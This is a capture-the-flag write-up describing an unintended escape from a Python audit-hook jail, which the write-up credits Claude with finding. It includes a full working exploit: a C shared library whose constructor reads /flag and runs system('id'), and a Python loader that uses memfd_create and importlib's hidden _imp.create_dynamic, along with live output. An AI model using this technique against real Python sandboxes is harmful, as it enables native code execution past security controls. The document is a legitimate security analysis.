# An unintended way out, kept on purpose

Claude went looking for unintended solutions on this pyjail and found one that
escapes through `os.memfd_create` and ends in native code. It stays in: it's a nice
trick, it's harder than the intended path, and you can't really patch it anyway.

The intended solution is still `_interpreters` — audit hooks are per-interpreter, so a
subinterpreter starts unhooked. This one is just a second, spicier road out.

Everything below was run against the live instance.

---

## The idea

`os.memfd_create` raises no audit event, so you get a writable file descriptor for
free. `dlopen` accepts `/proc/self/fd/N`. And `_imp.create_dynamic` is still reachable
despite the `del _imp` in `challenge.py`.

Put together: write a `.so` into memory, load it, and its ELF constructor runs native
code inside the jail process. From there `sys.addaudithook` is simply not in the
picture — the hook is Python, and nothing in libc asks it for permission.

## How it works

**`os.memfd_create` is silent.** No audit event, and `os.write` to the fd is silent
too. Nothing touches the filesystem, so the `"open"` entry in the blocklist never
comes up.

**`del _imp` didn't actually remove anything.** `del _imp.create_builtin` deletes the
attribute off the module object, so *that* one is really gone. But the second line
only unbinds a name and drops a `sys.modules` entry — the module itself is still alive
in the import machinery's globals:

```
>>> import importlib._bootstrap as B
>>> B._imp.create_dynamic
<built-in function create_dynamic>
>>> B._imp.exec_dynamic
<built-in function exec_dynamic>
>>> B._imp.create_builtin
AttributeError
```

**The constructor wins the race.** `create_dynamic` calls `dlopen()` first and only
then goes looking for `PyInit_<name>`. An `__attribute__((constructor))` function has
already run by then, so the `ImportError` you get at the end is just noise — your code
already executed.

---

## Two gotchas on the real container

### `importlib.util` doesn't exist there

`python:3.14-slim` pre-imports less than a normal distro Python. On the live box
`sys.modules` has 110 entries when the hook is armed, and of the importlib family only:

```
['importlib', 'importlib._bootstrap', 'importlib._bootstrap_external', 'importlib.machinery']
```

So `import importlib.util` is a brand-new import and kills your session on line one.
Any payload reaching for `importlib.util.spec_from_file_location` dies immediately.

Easiest fix: skip importlib. `create_dynamic` only reads two attributes off the spec,
`name` and `origin`, so anything with those works:

```python
S = type("S", (), {"name": "base64", "origin": P})()
```

(`importlib._bootstrap_external.spec_from_file_location` also works — that's where the
function actually lives; `importlib.util` just re-exports it.)

### Name your module after something already imported

`create_dynamic` does raise an `import` event, with `args[0]` being your `spec.name`:

```
('import', ('WEIRDNAME', '/path/to/module.so', None, None, None))
```

The hook checks that against a frozen snapshot of `sys.modules`, so pick a name that's
already in there — `base64`, `json`, `dis`, whatever. Costs nothing, since
`create_dynamic` doesn't consult `sys.modules` itself.

This only really bites if you try to load a *stock* extension, where the name has to
match the real `PyInit_` symbol:

```
>>> B._imp.create_dynamic(type("S",(),{"name":"_posixsubprocess","origin":P})())
[sandbox] denied: import _posixsubprocess -- session terminated
```

With your own `.so` it's a non-issue — you pick the name, and a constructor payload
doesn't need a `PyInit_` at all.

---

## The payload

```c
/* evil.c -- gcc -shared -fPIC -Os -o evil.so evil.c */
#include <fcntl.h>
#include <unistd.h>
#include <stdlib.h>

__attribute__((constructor))
static void boom(void) {
    write(1, "[+] native code running inside the jail\n", 40);
    int fd = open("/flag", O_RDONLY);
    if (fd >= 0) {
        char buf[256];
        ssize_t n = read(fd, buf, sizeof buf);
        if (n > 0) write(1, buf, (size_t)n);
        close(fd);
    }
    system("id");
}
```

`base64` is pre-imported by the challenge, so the `.so` ships inline — nothing needs a
compiler on the target. The remote is a pty in canonical mode, which caps a line at
4095 bytes, so append the blob in chunks (~15.6 kB `.so` → ~20.9 kB base64 → 6 chunks
of 3500):

```python
import sys, os, base64, importlib._bootstrap as B
BL = ""
BL += "<chunk 1>"
BL += "<chunk 2>"
...
fd = os.memfd_create("x"); os.write(fd, base64.b64decode(BL)); P = "/proc/self/fd/%d" % fd
S = type("S", (), {"name": "base64", "origin": P})()
B._imp.create_dynamic(S)
```

Result:

```
>>> fd = os.memfd_create("x"); os.write(fd, base64.b64decode(BL)); P = "/proc/self/fd/%d" % fd
15664
>>> S = type("S", (), {"name": "base64", "origin": P})()
>>> B._imp.create_dynamic(S)
[+] native code running inside the jail
CYBN{4_fr3sh_1nt3rpr3t3r_h4s_n0_4ud1t_h00ks}
uid=1000(challenge) gid=1000(challenge) groups=1000(challenge)
Traceback (most recent call last):
  File "<console>", line 1, in <module>
ImportError: dynamic module does not define module export function (PyInit_base64)
>>>
```

The `.so` only needs `GLIBC_2.2.5` / `GLIBC_2.4`, so one built on a much newer host
still loads inside the Debian image.

---

## Why it stays

You can't fix this from inside the policy. An audit hook only sees what CPython
chooses to announce, from Python, in the same address space. Once a `.so` is mapped,
the payload is machine code in that same process — it can read `/flag` directly,
`execve` a shell, or overwrite the interpreter's own hook list. No blocklist reaches
that.

Auditing `os.memfd_create` would raise the bar but not close it: any writable path the
process can reach (`/tmp`, `/dev/shm`, an `O_TMPFILE` fd) feeds `dlopen` just as well,
and ripping out `create_dynamic` would break legitimate extension imports. The real
fix lives outside the policy — seccomp, a separate process, a container.

Which is the same lesson the intended solution teaches from the other direction: an
in-process audit hook isn't a sandbox boundary.

---

## Notes

- Both spec forms were checked live: the duck-typed object and
  `_bootstrap_external.spec_from_file_location` + `ExtensionFileLoader`.
- The intended `_interpreters` path and `writeup/solve.py` still work — this doesn't
  displace them.
- Watch out when testing locally: a distro Python pre-imports more than
  `python:3.14-slim`, which is exactly how the `importlib.util` problem above slipped
  past Claude's first pass. Anything depending on that `sys.modules` snapshot needs
  checking on the real image.
